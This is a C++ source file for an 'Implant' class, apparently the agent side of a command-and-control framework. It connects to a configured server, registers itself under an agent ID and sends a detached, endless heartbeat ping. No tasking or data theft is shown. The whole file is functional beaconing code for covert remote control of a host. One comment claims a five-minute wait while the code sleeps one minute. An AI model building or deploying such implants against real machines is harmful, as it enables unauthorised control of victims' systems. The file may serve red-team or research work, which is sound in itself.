#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#include <thread>
#include <chrono>
#include <deque>
#include <asio.hpp>
#include <asio/ts/internet.hpp>
#include <asio/ts/buffer.hpp>

#include "implant.h"

using json = nlohmann::json;

Implant::Implant(std::string server_host, std::string server_port, std::string agent_id, bool isRunning):
    host{ std::move(server_host) },
    port{ std::move(server_port) }, 
    id{ std::move(agent_id) },
    isRunning{ std::move(isRunning) }
{
}

void Implant::beacon() {
    if (isRunning) {
        asio::error_code ec;
        asio::ip::tcp::endpoint endpoint(asio::ip::make_address(host, ec), std::stoi(port));
        asio::ip::tcp::socket socket(context); 
        asio::streambuf buf;

        std::deque<std::string> receive_queue;
        std::deque<std::string> send_queue;

        socket.async_connect(endpoint, [&](const asio::error_code& error) {
            if (!error) {
                std::cout << "Connected to the server!" << std::endl;
                
                // Listen for messages, need to have equivalent to .then(), maybe just add callback to add to receive queue
                msg::receiveResponse(socket, buf, receive_queue);

                registerAgent(socket);

                std::thread heartbeatThread(&Implant::heartbeat, this, std::ref(socket));
                heartbeatThread.detach();
                    
            } else {
                // Check for specific errors
                if (error == asio::error::connection_refused) {
                    std::cout << "Connection refused. The server may not be running." << std::endl;
                } else {
                    std::cout << "Error connecting to the server: " << error.message() << std::endl;
                }
            }
        });

        context.run();
    }
}

void handleResponse(std::deque<std::string>& response_queue) {
    while (!response_queue.empty()) {
        std::cout << response_queue.front() << std::endl;
        response_queue.pop_front();
    }
}

void Implant::registerAgent(asio::ip::tcp::socket& socket) {
    RegisterAgent registerAgent(id);
    msg::Request registerResult = registerAgent.run();
    msg::sendRequest(socket, registerResult);
}

// TODO: make into own thread or process
void Implant::heartbeat(asio::ip::tcp::socket& socket) { 
    while (true) {
        PingTask ping(id);
        msg::Request pingResult = ping.run();
        msg::sendRequest(socket, pingResult);

        // Wait for 5 minutes before the next heartbeat
        std::this_thread::sleep_for(std::chrono::minutes(1));
    } 
}

void Implant::setRunning(bool running) { isRunning = running; }
void Implant::setId(std::string& new_agent_id) { id = new_agent_id; }